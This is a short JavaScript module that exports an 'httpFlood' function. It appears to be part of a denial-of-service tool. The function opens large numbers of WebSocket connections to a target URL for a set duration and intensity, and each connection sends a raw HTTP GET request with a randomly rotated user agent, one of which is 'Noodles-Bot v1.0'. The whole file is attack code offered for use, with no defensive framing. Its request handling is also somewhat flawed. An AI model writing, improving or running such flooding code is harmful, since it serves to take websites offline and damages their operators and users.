async function httpFlood(target, duration, intensity) {
  const url = new URL(target);
  const host = url.hostname;
  const path = url.pathname || '/';
  const port = url.port || (url.protocol === 'https:' ? 443 : 80);
  const protocol = url.protocol === 'https:' ? 'https' : 'http';
  const startTime = Date.now();
  const interval = Math.max(1, 50 / intensity);
  const userAgents = [
    'Noodles-Bot v1.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
  ];

  while (Date.now() - startTime < duration * 1000) {
    for (let i = 0; i < intensity; i++) {
      try {
        const socket = new WebSocket(`${protocol === 'https' ? 'wss' : 'ws'}://${host}:${port}${path}`);

        socket.onopen = () => {
          const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
          const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nConnection: keep-alive\r\n`;
          socket.send(payload);
        };

        socket.onerror = (error) => {
          socket.close();
        };

        socket.onclose = () => {};
      } catch (error) {}
    }
    await new Promise(resolve => setTimeout(resolve, interval));
  }
}

module.exports = { httpFlood };